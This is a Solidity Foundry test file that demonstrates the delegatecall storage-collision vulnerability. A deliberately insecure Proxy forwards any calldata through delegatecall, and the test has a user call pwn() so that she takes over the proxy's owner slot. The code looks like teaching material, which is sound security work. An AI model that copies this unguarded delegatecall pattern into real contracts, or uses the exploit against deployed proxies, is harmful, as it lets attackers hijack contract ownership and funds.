// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";

contract Proxy {
    address public owner = address(0xdeadbeef); //slot 0
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
    }

    fallback() external {
        (bool suc,) = address(delegate).delegatecall(msg.data); // vulnerable
        require(suc, "Delegatecall failed");
    }
}

contract Delegate {
    address public owner; //slot 0

    function pwn() public {
        owner = msg.sender;
    }
}

contract DelegateTest is Test {
    Proxy proxy;
    Delegate delegateContract;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        delegateContract = new Delegate();
        proxy = new Proxy(address(delegateContract));

        console.log("Alice address", alice);
        console.log("Delegate contract owner", proxy.owner());

        //Delegatecall allows a smart contract to dynamically load code from a different address at runtime
        console.log("Change delegateContract owner to alice ......");
        vm.prank(alice);
        (bool success,) = address(proxy).call(abi.encodeWithSignature("pwn()")); //exploit here
        require(success);
        //Proxy.fallbacl() will delegatecall Delegate.pwn()

        console.log("DelegateContract owner", proxy.owner());
        assertEq(proxy.owner(), alice);
    }
}
